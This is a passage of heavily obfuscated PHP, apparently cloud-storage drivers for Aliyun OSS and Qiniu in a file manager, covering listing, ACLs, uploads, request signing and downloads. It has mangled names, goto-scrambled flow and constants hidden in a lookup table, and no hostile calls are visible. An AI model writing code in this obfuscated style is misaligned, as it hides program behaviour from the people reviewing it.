$C¦Öß—ç¶½ =& $_SERVER[¦·]; $eÜÍƒ¼²—š = trim($eÜÍƒ¼²—š, $C¦Öß—ç¶½[8]); $E²£ØÜ©°« = empty($eÜÍƒ¼²—š) ? $C¦Öß—ç¶½[33] : $eÜÍƒ¼²—š . $C¦Öß—ç¶½[8]; goto aÊ›©…ğ; aÊ›©…ğ: $Eàœğ¤© = $C¦Öß—ç¶½[33]; $bÖ‚¬Šõ¨ = 500; $aÚ¡²ï¾Ü = 0; goto fëİØâ©¦; fëİØâ©¦: $BÁ¥Îí¼œ… = 0; while (!0) { $EâåÉÊç× = array($C¦Öß—ç¶½[1185] => $C¦Öß—ç¶½[8], $C¦Öß—ç¶½[186] => $E²£ØÜ©°«, $C¦Öß—ç¶½[1186] => $bÖ‚¬Šõ¨, $C¦Öß—ç¶½[1187] => $Eàœğ¤©); try { $eåœ¢È–† = $this->client->listObjects($this->bucket, $EâåÉÊç×); } catch (OSS\Core\OssException $E­Ø˜®ÙŸå) { break; } $Eàœğ¤© = $eåœ¢È–†->getNextMarker(); $Fæ¾†­’‡Ï = $eåœ¢È–†->getObjectList(); $e¶óÇ¸Õ´³ = $eåœ¢È–†->getPrefixList(); if ($a»ïôº‹®) { if (count($Fæ¾†­’‡Ï) > 1 || count($Fæ¾†­’‡Ï) == 1 && $Fæ¾†­’‡Ï[0]->getKey() != $E²£ØÜ©°«) { $aÚ¡²ï¾Ü += count($Fæ¾†­’‡Ï) - 1; } if (!empty($e¶óÇ¸Õ´³)) { $BÁ¥Îí¼œ… += count($e¶óÇ¸Õ´³); } if ($Eàœğ¤© === $C¦Öß—ç¶½[33]) { break; } continue; } if ($C»¿ËÌª˜) { if (!empty($Fæ¾†­’‡Ï)) { if (count($Fæ¾†­’‡Ï) > 1 || $Fæ¾†­’‡Ï[0]->getKey() != $E²£ØÜ©°«) { return !0; } } } else { if (!empty($e¶óÇ¸Õ´³)) { return !0; } } if ($Eàœğ¤© === $C¦Öß—ç¶½[33]) { break; } } if ($a»ïôº‹®) { return array($C¦Öß—ç¶½[191] => $aÚ¡²ï¾Ü, $C¦Öß—ç¶½[192] => $BÁ¥Îí¼œ…); } goto Dé‰”É§ˆ; E×¾Îëæ‹: } public function listAll($f˜†àäÂ³â) { $A¼¹àÂ­áƒ =& $_SERVER[¦·]; $C ¶¤§† = $this->fileList($f˜†àäÂ³â, $A¼¹àÂ­áƒ[33], !0); $FñÉ›õ = array(); foreach ($C ¶¤§†[$A¼¹àÂ­áƒ[73]] as $A„©¥Æ¯‘) { $FñÉ›õ[$A„©¥Æ¯‘[$A¼¹àÂ­áƒ[28]]] = $A„©¥Æ¯‘[$A¼¹àÂ­áƒ[77]]; } return $this->listAllFiles($f˜†àäÂ³â, array_keys($FñÉ›õ), $FñÉ›õ); } public function canRead($e÷ĞÕ‚–´¾) { $eÛ…ÜÓá” =& $_SERVER[¦·]; $bªÍ™¼¢øœ = $this->pathAcl($e÷ĞÕ‚–´¾); return $bªÍ™¼¢øœ == $eÛ…ÜÓá”[1198] || $bªÍ™¼¢øœ == $eÛ…ÜÓá”[493] ? !0 : !1; } public function canWrite($béŠ—Èœ°Ã) { $Aì‘ÓÍÂÃÉ = $this->pathAcl($béŠ—Èœ°Ã); return $Aì‘ÓÍÂÃÉ == $_SERVER[¦·][493] ? !0 : !1; } public function pathAcl($Ağ»§¿¹ºƒ) { goto Eí¡ŒùÎƒ; Eí¡ŒùÎƒ: $D’÷ì¹…áŒ =& $_SERVER[¦·]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Cæ ŠŸœ†² = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ağ»§¿¹ºƒ)); } catch (OSS\Core\OssException $EŸ˜ÔÂØ…á) { return !1; } goto AÏ×”ğÖ; AÏ×”ğÖ: $BÊÈ¸ï–ˆ‚ = $Cæ ŠŸœ†² == $D’÷ì¹…áŒ[34] ? $this->bucketAcl : $Cæ ŠŸœ†²; if ($BÊÈ¸ï–ˆ‚ == $D’÷ì¹…áŒ[1199]) { return $D’÷ì¹…áŒ[1198]; } if ($BÊÈ¸ï–ˆ‚ == $D’÷ì¹…áŒ[1200]) { return $D’÷ì¹…áŒ[493]; } goto eÆ“‹ßÇ¸ì; eÆ“‹ßÇ¸ì: return $BÊÈ¸ï–ˆ‚; goto C»Ôù²Èø; C»Ôù²Èø: } private function chmodPath($f£Í†Î“¯Ç, $a’–áõİò = '') { $Có„½Ò¼ùİ =& $_SERVER[¦·]; $dê³§±¡´¾ = empty($a’–áõİò) ? $Có„½Ò¼ùİ[1200] : $a’–áõİò; $D¿äÄš» = array($Có„½Ò¼ùİ[34], $Có„½Ò¼ùİ[185], $Có„½Ò¼ùİ[1199], $Có„½Ò¼ùİ[1200]); if (!in_array($dê³§±¡´¾, $D¿äÄš»)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($f£Í†Î“¯Ç), $dê³§±¡´¾); } catch (OSS\Core\OssException $F»«é¬ÊÂ) { return !1; } return !0; } public function getContent($cÒ×ÜÙ²Á) { return $this->fileSubstr($cÒ×ÜÙ²Á, -1); } public function setContent($A¦ƒ“èÊ²³, $EÜÌÑ§äÆ„ = '') { $f‰éÂÁÁò =& $_SERVER[¦·]; try { $AÎö—¶ŠŒ = $this->trafficLimit($f‰éÂÁÁò[1201]); $AÈäì³ Ù = $this->client->putObject($this->bucket, $this->pathEncode($A¦ƒ“èÊ²³), $EÜÌÑ§äÆ„, $AÎö—¶ŠŒ); } catch (OSS\Core\OssException $f¹ˆ»Îä¢à) { return !1; } $A‹¡õ”· = array($f‰éÂÁÁò[1188] => trim($AÈäì³ Ù[$f‰éÂÁÁò[1202]], $f‰éÂÁÁò[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($A¦ƒ“èÊ²³))); $this->updateObjMeta($A¦ƒ“èÊ²³, $A‹¡õ”·); return isset($AÈäì³ Ù[$f‰éÂÁÁò[1203]][$f‰éÂÁÁò[1151]]) ? (int) $AÈäì³ Ù[$f‰éÂÁÁò[1203]][$f‰éÂÁÁò[1151]] : strlen($AÈäì³ Ù); } private function updateObjMeta($F Œù•·ï, $bÉëÇ¯‰) { $F Œù•·ï = $this->pathEncode($F Œù•·ï); try { $a½‹«ËáÁ‹ = array(OSS\OssClient::OSS_HEADERS => $bÉëÇ¯‰); $this->client->copyObject($this->bucket, $F Œù•·ï, $this->bucket, $F Œù•·ï, $a½‹«ËáÁ‹); } catch (OSS\Core\OssException $bÍ¾ôë×Ç) { return !1; } return !0; } public function upload($fÇ÷ É¥ë‡, $a™òŞ³ĞÚ, $D—…èÎÂÜ = false, $bí ¦‘—¢Ê = REPEAT_REPLACE) { $DïÄœÖœ½ =& $_SERVER[¦·]; $c‘µò§¹Çç = trim($fÇ÷ É¥ë‡, $DïÄœÖœ½[8]); $b³ßõÄèŞ¬ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($DïÄœÖœ½[1188] => @md5_file($a™òŞ³ĞÚ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($fÇ÷ É¥ë‡))); $b³ßõÄèŞ¬ = $this->trafficLimit($DïÄœÖœ½[1201], $b³ßõÄèŞ¬); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($c‘µò§¹Çç), $a™òŞ³ĞÚ, $b³ßõÄèŞ¬); } catch (OSS\Core\OssException $c˜çùøâ) { return !1; } return $this->getPathOuter($fÇ÷ É¥ë‡); } public function getHost() { $E£ŠĞ¥Ú¢¸ =& $_SERVER[¦·]; $aÀ •ÆğçŒ = explode($E£ŠĞ¥Ú¢¸[171], parent::getHost()); return $aÀ •ÆğçŒ[0] . $E£ŠĞ¥Ú¢¸[171] . $this->bucket . $E£ŠĞ¥Ú¢¸[91] . $aÀ •ÆğçŒ[1]; } public function uploadFormData($BéùÙ–¨İö, $CÈà„Í¬· = 3600) { goto CÎµîê¡Ë¯; CÎµîê¡Ë¯: $Aä„İ†ˆš =& $_SERVER[¦·]; if (!($a”İæ²ù†” = $this->getHost())) { return !1; } $bõœƒØŒ¢Ü = $CÈà„Í¬·; goto eÒ¨´ñ§; Cœ­Ï¬½Í‹: $Dˆ»µ†Ñ„Æ = base64_encode(hash_hmac($Aä„İ†ˆš[218], $D›éîÖŠÖ¤, $this->secret, !0)); $e¤‰ÅëÆ‘ = array($Aä„İ†ˆš[1115] => $D›éîÖŠÖ¤, $Aä„İ†ˆš[1207] => $this->accessKey, $Aä„İ†ˆš[1111] => $Aä„İ†ˆš[1103], $Aä„İ†ˆš[1208] => $Dˆ»µ†Ñ„Æ, $Aä„İ†ˆš[169] => $a”İæ²ù†”); $e¤‰ÅëÆ‘ = $this->trafficLimit($Aä„İ†ˆš[1201], $e¤‰ÅëÆ‘); goto A ¤ã”‚¾; eÒ¨´ñ§: $b÷ˆøà±ì… = date($Aä„İ†ˆš[1204], time() + $bõœƒØŒ¢Ü); $aï£¹äˆÔï = new DateTime($b÷ˆøà±ì…); $aŒ¹íÔ¬¹ = $aï£¹äˆÔï->format(DateTime::ISO8601); goto EˆãØ°µ·; EˆãØ°µ·: $cÎŠ›†î = strpos($aŒ¹íÔ¬¹, $Aä„İ†ˆš[284]); $aŒ¹íÔ¬¹ = substr($aŒ¹íÔ¬¹, 0, $cÎŠ›†î) . $Aä„İ†ˆš[1205]; $aí“ƒÓ˜Û¶ = 1048576000 * 5; goto BÈ‘©±î¶; BÈ‘©±î¶: $FŒ›ì®éîÛ = $this->pathFather($BéùÙ–¨İö); $BÁ˜óÂ = array($Aä„İ†ˆš[1105] => $aŒ¹íÔ¬¹, $Aä„İ†ˆš[1106] => array(array($Aä„İ†ˆš[1206], 0, $aí“ƒÓ˜Û¶), array($Aä„İ†ˆš[1109], $Aä„İ†ˆš[1110], $FŒ›ì®éîÛ))); $D›éîÖŠÖ¤ = base64_encode(json_encode($BÁ˜óÂ)); goto Cœ­Ï¬½Í‹; A ¤ã”‚¾: return $e¤‰ÅëÆ‘; goto dªÌ±šŞ÷÷; dªÌ±šŞ÷÷: } public function multiUploadFormData($aƒ¥Ë˜«‰ , $C‚—ª¨Ö‘ = 3600) { $Bï¸ÉÏÏ©Ÿ =& $_SERVER[¦·]; if (!($dÚ£ğßÅË = $this->getHost())) { return !1; } $e…‹Í‡¬•© = $this->trafficLimit($Bï¸ÉÏÏ©Ÿ[1201]); $fŒÏœª¹Ä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aƒ¥Ë˜«‰ ), $e…‹Í‡¬•©); return array($Bï¸ÉÏÏ©Ÿ[209] => $fŒÏœª¹Ä, $Bï¸ÉÏÏ©Ÿ[169] => $dÚ£ğßÅË . $Bï¸ÉÏÏ©Ÿ[8] . $this->pathEncode($aƒ¥Ë˜«‰ ), $Bï¸ÉÏÏ©Ÿ[210] => gmdate($Bï¸ÉÏÏ©Ÿ[1209]), $Bï¸ÉÏÏ©Ÿ[89] => $aƒ¥Ë˜«‰ ); } public function multiUploadAuthData($a‰ÜÍôõë­, $B­÷¾šñ = array()) { goto a‰é—Ù›Ï‹; aª ö¢óˆù: $D®ª¨ƒõÔŞ = array($aà›»¯›—·[212], $aà›»¯›—·[33], $aà›»¯›—·[116], $FÆ…ö‘˜œ×, "\x78\x2d\157\163\x73\x2d\144\x61\x74\145\72{$FÆ…ö‘˜œ×}", $aà›»¯›—·[8] . $this->bucket . $aà›»¯›—·[8] . $cª‘…„ğ³ . $bŠÄ›¤Äòí); if (strpos($bŠÄ›¤Äòí, $aà›»¯›—·[213]) === 0) { $D®ª¨ƒõÔŞ[0] = $aà›»¯›—·[214]; if ($e‚ğêÚì = $this->trafficLimit($aà›»¯›—·[1201])) { $cª‘…„ğ³ = $aà›»¯›—·[1210]; array_splice($D®ª¨ƒõÔŞ, 5, 0, $cª‘…„ğ³ . $aà›»¯›—·[4] . $e‚ğêÚì[$cª‘…„ğ³]); } } if (isset($B­÷¾šñ[$aà›»¯›—·[215]]) && $B­÷¾šñ[$aà›»¯›—·[215]] == $aà›»¯›—·[216]) { $D®ª¨ƒõÔŞ[0] = $aà›»¯›—·[216]; } goto E«í½‡ƒªÔ; F¸øôõŞ­¢: $c¬«Ùõ¿Š» = $aà›»¯›—·[1212] . $this->accessKey . $aà›»¯›—·[4] . $aÍ™Ñ‹º´÷; if (strpos($bŠÄ›¤Äòí, $aà›»¯›—·[213]) === 0) { $c¬«Ùõ¿Š» = array($aà›»¯›—·[220] => $c¬«Ùõ¿Š», $aà›»¯›—·[210] => $FÆ…ö‘˜œ×); if ($e‚ğêÚì) { $c¬«Ùõ¿Š» = array_merge($c¬«Ùõ¿Š», $e‚ğêÚì); } } return $c¬«Ùõ¿Š»; goto c¤·„ø§à; a‰é—Ù›Ï‹: $aà›»¯›—· =& $_SERVER[¦·]; $FÆ…ö‘˜œ× = isset($B­÷¾šñ[$aà›»¯›—·[210]]) ? $B­÷¾šñ[$aà›»¯›—·[210]] : gmdate($aà›»¯›—·[1209]); $bŠÄ›¤Äòí = isset($B­÷¾šñ[$aà›»¯›—·[160]]) ? $B­÷¾šñ[$aà›»¯›—·[160]] : $aà›»¯›—·[33]; goto bâÎİ·çòŒ; E«í½‡ƒªÔ: if (!empty($B­÷¾šñ[$aà›»¯›—·[1211]])) { $Eí’ –ÈŠ = array_merge(array($D®ª¨ƒõÔŞ[4]), $B­÷¾šñ[$aà›»¯›—·[1211]]); sort($Eí’ –ÈŠ); $D®ª¨ƒõÔŞ[4] = implode($aà›»¯›—·[217], $Eí’ –ÈŠ); } $fŸ†»ŒøÁ = implode($aà›»¯›—·[217], $D®ª¨ƒõÔŞ); $aÍ™Ñ‹º´÷ = base64_encode(hash_hmac($aà›»¯›—·[218], $fŸ†»ŒøÁ, $this->secret, !0)); goto F¸øôõŞ­¢; bâÎİ·çòŒ: $cª‘…„ğ³ = $a‰ÜÍôõë­; if (isset($B­÷¾šñ[$aà›»¯›—·[89]])) { $cª‘…„ğ³ = $B­÷¾šñ[$aà›»¯›—·[89]]; unset($B­÷¾šñ[$aà›»¯›—·[89]]); } if (isset($B­÷¾šñ[$aà›»¯›—·[211]])) { $B­÷¾šñ[$aà›»¯›—·[210]] = $FÆ…ö‘˜œ×; return $this->listUploadParts($cª‘…„ğ³, $B­÷¾šñ); } goto aª ö¢óˆù; c¤·„ø§à: } public function listUploadParts($cŒÉĞê¾¾ , $AŒ¶Ï¸‰”ô) { goto AÏÁØ„õ©†; AÏÁØ„õ©†: $FåĞ†Æ¬ÌÕ =& $_SERVER[¦·]; $Eá¬ŠÛ•ä = parse_url_query($AŒ¶Ï¸‰”ô[$FåĞ†Æ¬ÌÕ[160]]); $FãÌŞˆŠç = $this->client->listParts($this->bucket, $this->pathEncode($cŒÉĞê¾¾ ), $Eá¬ŠÛ•ä[$FåĞ†Æ¬ÌÕ[209]]); goto CªİãÊšÆ; CªİãÊšÆ: $dƒÌ‰³Èâ´ = $FãÌŞˆŠç->getListPart(); $e‡èŠœƒŒŠ = array(); foreach ($dƒÌ‰³Èâ´ as $A’Ûˆ÷Û°¦) { $e‡èŠœƒŒŠ[] = array($FåĞ†Æ¬ÌÕ[1192] => $A’Ûˆ÷Û°¦->getPartNumber(), $FåĞ†Æ¬ÌÕ[1193] => trim($A’Ûˆ÷Û°¦->getETag(), $FåĞ†Æ¬ÌÕ[113])); } goto dÖ°‰²»˜; Aã§„ß™¡¼: return array($FåĞ†Æ¬ÌÕ[220] => $e”ÉÄàÙâö, $FåĞ†Æ¬ÌÕ[210] => $AŒ¶Ï¸‰”ô[$FåĞ†Æ¬ÌÕ[210]], $FåĞ†Æ¬ÌÕ[222] => $e‡èŠœƒŒŠ); goto aˆèÈèáØÎ; dÖ°‰²»˜: unset($AŒ¶Ï¸‰”ô[$FåĞ†Æ¬ÌÕ[211]], $AŒ¶Ï¸‰”ô[$FåĞ†Æ¬ÌÕ[215]]); $e”ÉÄàÙâö = $this->multiUploadAuthData($cŒÉĞê¾¾ , $AŒ¶Ï¸‰”ô); if (empty($e”ÉÄàÙâö)) { return !1; } goto Aã§„ß™¡¼; aˆèÈèáØÎ: } public function download($f¨­²îƒ”‡, $F™ŠµÕ·ï) { if ($this->isFolder($f¨­²îƒ”‡)) { return !1; } try { $EĞÀáİ±Åª = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $F™ŠµÕ·ï); $EĞÀáİ±Åª = $this->trafficLimit($_SERVER[¦·][105], $EĞÀáİ±Åª); $this->client->getObject($this->bucket, $this->pathEncode($f¨­²îƒ”‡), $EĞÀáİ±Åª); } catch (OSS\Core\OssException $E‹ãˆ™•Š·) { return !1; } return $F™ŠµÕ·ï; } public function fileSubstr($FßŠÀ›ÚÊ, $a†­´²¦ğÊ = 0, $bÏÆµ = false) { if ($a†­´²¦ğÊ === -1) { $e§š‰ÊÏØŠ = array(); } else { if ($bÏÆµ === !1) { $d²¬ŒŠ½çç = $this->size($FßŠÀ›ÚÊ); } else { $d²¬ŒŠ½çç = $a†­´²¦ğÊ + $bÏÆµ - 1; } $e§š‰ÊÏØŠ = array(OSS\OssClient::OSS_RANGE => "{$a†­´²¦ğÊ}\55{$d²¬ŒŠ½çç}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($FßŠÀ›ÚÊ), $e§š‰ÊÏØŠ); } catch (OSS\Core\OssException $F­¦„˜Æ¼) { think_exception($F­¦„˜Æ¼->getMessage()); return !1; } } private function trafficLimit($AÊ¡ëÓ«÷Î, $AÆ…îàïˆí = array()) { goto c¨ĞÂ±‹¶; Dí›è²Ö‘‰: return $AÆ…îàïˆí; goto Bé†ËŸá™; Dğ‘×éÃã: if (!$aÖéÚÌÂÀ) { return $AÆ…îàïˆí; } $aÖéÚÌÂÀ = $aÖéÚÌÂÀ < 819200 ? 819200 : ($aÖéÚÌÂÀ > 838860800 ? 838860800 : $aÖéÚÌÂÀ); $AÆ…îàïˆí[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($aÖéÚÌÂÀ); goto Dí›è²Ö‘‰; c¨ĞÂ±‹¶: $añ©ãæÂÁÃ =& $_SERVER[¦·]; if ($AÊ¡ëÓ«÷Î == $añ©ãæÂÁÃ[1201] && $this->isUploadServer() || $AÊ¡ëÓ«÷Î == $añ©ãæÂÁÃ[105] && $this->isFileOutServer()) { return $AÆ…îàïˆí; } $aÖéÚÌÂÀ = floatval($GLOBALS[$añ©ãæÂÁÃ[6]][$añ©ãæÂÁÃ[84]][$añ©ãæÂÁÃ[103]][$AÊ¡ëÓ«÷Î]) * 1024 * 1024 * 8; goto Dğ‘×éÃã; Bé†ËŸá™: } public function link($EáŸ“Óë¢ê, $bÏÏ—‰ßª = array()) { $AØ®­¹Æ¨ =& $_SERVER[¦·]; if (!$this->exist($EáŸ“Óë¢ê) || $this->isFolder($EáŸ“Óë¢ê)) { return !1; } try { $bÏÏ—‰ßª = $this->trafficLimit($AØ®­¹Æ¨[105], $bÏÏ—‰ßª); $aÎ¸º¢«‡¶ = $this->client->signUrl($this->bucket, $this->pathEncode($EáŸ“Óë¢ê), 3600 * 12, $AØ®­¹Æ¨[216], $bÏÏ—‰ßª); return $this->getCdnLink($aÎ¸º¢«‡¶); } catch (OSS\Core\OssException $D÷ƒµ¢®é÷) { return !1; } } public function fileOut($C¤¥Ô´­åä, $bºªöà¿… = false, $bÖ­Ã•œºã = false, $b…°“‹ÈÓ = '') { goto Cİ‘¹¿Ÿ‚É; FŞ‘™É¾Û: $bºªöà¿… = $bºªöà¿… ? $E·çÛõÌ¸Ê[202] : $E·çÛõÌ¸Ê[203]; $a½£¼†À§… = array(OSS\OssClient::OSS_SUB_RESOURCE => $E·çÛõÌ¸Ê[1213] . rawurlencode("{$bºªöà¿…}\73\146\x69\x6c\145\156\x61\x6d\145\75{$bÖ­Ã•œºã}")); $a½£¼†À§…[OSS\OssClient::OSS_SUB_RESOURCE] .= $E·çÛõÌ¸Ê[1214] . rawurlencode($cÃíéÌ»°); goto B“¦ó´‡; Cİ‘¹¿Ÿ‚É: $E·çÛõÌ¸Ê =& $_SERVER[¦·]; if ($this->isFileOutServer()) { return $this->fileOutServer($C¤¥Ô´­åä, $bºªöà¿…, $bÖ­Ã•œºã, $b…°“‹ÈÓ); } if (!$bÖ­Ã•œºã) { $bÖ­Ã•œºã = $this->pathThis($C¤¥Ô´­åä); } goto F©“„åÄ¥; F©“„åÄ¥: $bÖ­Ã•œºã = rawurlencode($bÖ­Ã•œºã); $cÃíéÌ»° = get_file_mime(get_path_ext($bÖ­Ã•œºã)); if ($cÃíéÌ»° == $E·çÛõÌ¸Ê[201]) { return parent::fileOut($C¤¥Ô´­åä, $bºªöà¿…, $bÖ­Ã•œºã, $b…°“‹ÈÓ); } goto FŞ‘™É¾Û; B“¦ó´‡: $EÖĞŸÜ£± = $this->link($C¤¥Ô´­åä, $a½£¼†À§…); $this->fileOutLink($EÖĞŸÜ£±); goto e¹‰ùî¡ÓÚ; e¹‰ùî¡ÓÚ: } public function fileOutServer($bÖ¿Â¢öóÙ, $EË¥ÅÎ¬ç = false, $B‡Ìù›öÜƒ = false, $a¯›…¹¼å = '') { parent::fileOut($bÖ¿Â¢öóÙ, $EË¥ÅÎ¬ç, $B‡Ìù›öÜƒ, $a¯›…¹¼å); } public function fileOutImage($eÛ‰²Ëºš¾, $BÊËÀ‰ØÙÆ = 250) { $BÂãÅìâÖø = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¦·][1215] . $BÊËÀ‰ØÙÆ); $bé­ÔŠÄå¡ = $this->link($eÛ‰²Ëºš¾, $BÂãÅìâÖø); $this->fileOutLink($bé­ÔŠÄå¡); } public function fileOutImageServer($BØßô‡½¡, $EØĞßƒÛ®• = 250) { parent::fileOutImage($BØßô‡½¡, $EØĞßƒÛ®•); } public function fileOutLink($DñÏ÷ñ½´œ) { $F·ñŒ£‡…ñ =& $_SERVER[¦·]; if (!$this->isCdnHost() && substr($DñÏ÷ñ½´œ, 0, 7) == $F·ñŒ£‡…ñ[1118]) { $DñÏ÷ñ½´œ = $F·ñŒ£‡…ñ[1119] . substr($DñÏ÷ñ½´œ, 7); } header($F·ñŒ£‡…ñ[156] . $DñÏ÷ñ½´œ); die; } public function hashMd5($fÔ°‹÷½¥Î, $fœÒ¹¼êÈ = '') { $fºğ‹õ¶Â =& $_SERVER[¦·]; $bÑ•Á¤ØÕ = $this->objectMeta($fÔ°‹÷½¥Î); if (!$bÑ•Á¤ØÕ) { return $fºğ‹õ¶Â[33]; } if (!isset($bÑ•Á¤ØÕ[$fºğ‹õ¶Â[1188]]) && !empty($fœÒ¹¼êÈ)) { $e¼†åĞ˜ß¥ = $this->updateObjMeta($fÔ°‹÷½¥Î, array($fºğ‹õ¶Â[1188] => $fœÒ¹¼êÈ)); $bÑ•Á¤ØÕ[$fºğ‹õ¶Â[1188]] = $e¼†åĞ˜ß¥ ? $fœÒ¹¼êÈ : $fºğ‹õ¶Â[33]; } return isset($bÑ•Á¤ØÕ[$fºğ‹õ¶Â[1188]]) ? strtolower($bÑ•Á¤ØÕ[$fºğ‹õ¶Â[1188]]) : $fºğ‹õ¶Â[33]; } public function size($fí ¶¡–«‹) { $a ×„‹Äã¯ = $this->objectMeta($fí ¶¡–«‹); return $a ×„‹Äã¯ ? $a ×„‹Äã¯[$_SERVER[¦·][77]] : 0; } public function info($BšŒŒÆÅ‡µ) { if ($this->isFolder($BšŒŒÆÅ‡µ)) { return $this->folderInfo($BšŒŒÆÅ‡µ); } else { if ($this->isFile($BšŒŒÆÅ‡µ)) { return $this->fileInfo($BšŒŒÆÅ‡µ); } } return !1; } public function exist($càÜÏÙ¥È) { return $this->isFile($càÜÏÙ¥È) || $this->isFolder($càÜÏÙ¥È); } public function isFile($E±Š¡‚†ÌØ) { return !$this->isFolder($E±Š¡‚†ÌØ) && $this->objectMeta($E±Š¡‚†ÌØ); } public function isFolder($eÍÆàĞ¤¿ª) { return $this->cacheMethod($_SERVER[¦·][223], $eÍÆàĞ¤¿ª); } protected function objectMeta($fù†ã®Éİ†) { return $this->cacheMethod($_SERVER[¦·][224], $fù†ã®Éİ†); } protected function _objectMeta($d¼­‚ªøĞì) { $CÁÓôœ¢ƒÑ =& $_SERVER[¦·]; try { $Eô â¢·Š± = $this->client->getObjectMeta($this->bucket, $this->pathEncode($d¼­‚ªøĞì)); } catch (OSS\Core\OssException $aùë¯‹ƒ‰) { $Eô â¢·Š± = !1; } if ($Eô â¢·Š±) { $Eô â¢·Š±[$CÁÓôœ¢ƒÑ[77]] = intval($Eô â¢·Š±[$CÁÓôœ¢ƒÑ[1195]]); } return $Eô â¢·Š±; } protected function _isFolder($DîâäÖ•‚à) { $EÜù©›øòÖ =& $_SERVER[¦·]; if ($DîâäÖ•‚à == $EÜù©›øòÖ[33] || $DîâäÖ•‚à == $EÜù©›øòÖ[8]) { return !0; } $d¦µ‹ç§ã = array($EÜù©›øòÖ[1185] => $EÜù©›øòÖ[8], $EÜù©›øòÖ[186] => rtrim($DîâäÖ•‚à, $EÜù©›øòÖ[8]) . $EÜù©›øòÖ[8], $EÜù©›øòÖ[1186] => 1, $EÜù©›øòÖ[1187] => $EÜù©›øòÖ[33]); $C¾ğ²”ñî = $this->client->listObjects($this->bucket, $d¦µ‹ç§ã); if ($C¾ğ²”ñî->getObjectList() || $C¾ğ²”ñî->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($A¯‹ØÒŒçá) { parent::__construct(); require_once SDK_DIR . $_SERVER[¦·][1216]; $this->_init($A¯‹ØÒŒçá); } public function _init($f‘£¶ä·®¾) { foreach ($f‘£¶ä·®¾ as $eï¯Ù·ó© => $D´Á™øàÑ) { if (isset($this->{$eï¯Ù·ó©})) { $this->{$eï¯Ù·ó©} = $D´Á™øàÑ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¦·][1217], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($DòÅƒ®à›¤, $BÒ°‘“Å = '', $cŠãºå§¯¬ = REPEAT_RENAME) { if ($this->setContent($DòÅƒ®à›¤, $BÒ°‘“Å)) { return $this->getPathOuter($DòÅƒ®à›¤); } return !1; } public function mkdir($d—àÍ‘¥Ê¿, $cÇ¢œ½Øñµ = REPEAT_SKIP) { goto C§º‚™ñ„Ö; BÎ”É»Èî: if (!$this->mkfile($DÚ‹·‰è¤)) { return !1; } if (!$this->moveFile($DÚ‹·‰è¤, $d—àÍ‘¥Ê¿)) { $this->delFile($DÚ‹·‰è¤); return !1; } return $this->getPathOuter($F½¥ÛìØâ‹); goto eßŒª«¶•; Aóƒš‰Ü¶á: $d—àÍ‘¥Ê¿ = $F½¥ÛìØâ‹ . $E¯µ‹–—Ş[8]; $d½â‰ôÇà‰ = get_path_this($F½¥ÛìØâ‹); $DÚ‹·‰è¤ = $d—àÍ‘¥Ê¿ . $d½â‰ôÇà‰; goto BÎ”É»Èî; C§º‚™ñ„Ö: $E¯µ‹–—Ş =& $_SERVER[¦·]; $F½¥ÛìØâ‹ = trim($d—àÍ‘¥Ê¿, $E¯µ‹–—Ş[8]); if ($this->_isFolder($F½¥ÛìØâ‹)) { return $this->getPathOuter($F½¥ÛìØâ‹); } goto Aóƒš‰Ü¶á; eßŒª«¶•: } public function copyFile($Cå‚Î—Ìˆõ, $aÏŠöí‹°½) { $AéŠ÷·í¶ß = $this->bucketManager->copy($this->bucket, $Cå‚Î—Ìˆõ, $this->bucket, $aÏŠöí‹°½, !0); return $AéŠ÷·í¶ß ? !1 : $this->getPathOuter($aÏŠöí‹°½); } public function moveFile($fŒ†ÛÑ»Ì, $DÍš÷›’ö) { $B†‘†ã†Åá = $this->bucketManager->move($this->bucket, $fŒ†ÛÑ»Ì, $this->bucket, $DÍš÷›’ö, !0); return $B†‘†ã†Åá ? !1 : $this->getPathOuter($DÍš÷›’ö); } public function delFile($B‰ÏÛÃëó®) { $D‡ÇƒÁÏëŸ = $this->bucketManager->delete($this->bucket, $B‰ÏÛÃëó®); return $D‡ÇƒÁÏëŸ ? !1 : !0; } public function delFolder($eš•¡¬­ä‹) { $FìÇÆÅ–Ç¼ = $this->fileList($eš•¡¬­ä‹); if (empty($FìÇÆÅ–Ç¼)) { return !0; } $b¿Ş®ÊóèÓ = 1000; if (count($FìÇÆÅ–Ç¼) <= $b¿Ş®ÊóèÓ) { return $this->qnDelObj($FìÇÆÅ–Ç¼) ? !1 : !0; } foreach (array_chunk($FìÇÆÅ–Ç¼, $b¿Ş®ÊóèÓ) as $B×ÚÚÆ„·”) { $B›¶Î”óæô = $this->qnDelObj($B×ÚÚÆ„·”); if ($B›¶Î”óæô) { return !1; } } return !0; } private function qnDelObj($Bç´ÔÜ½áš) { $eé™Û¹Ê = $this->bucketManager->buildBatchDelete($this->bucket, $Bç´ÔÜ½áš); list($c¦ô„Ù»Ö, $d­Ï«Ç“ô¡) = $this->bucketManager->batch($eé™Û¹Ê); return $d­Ï«Ç“ô¡; } private function fileList($A©•šƒ¤âš, $d‘Õ·Äè©µ = 0) { goto D“®ë©ãÜ; 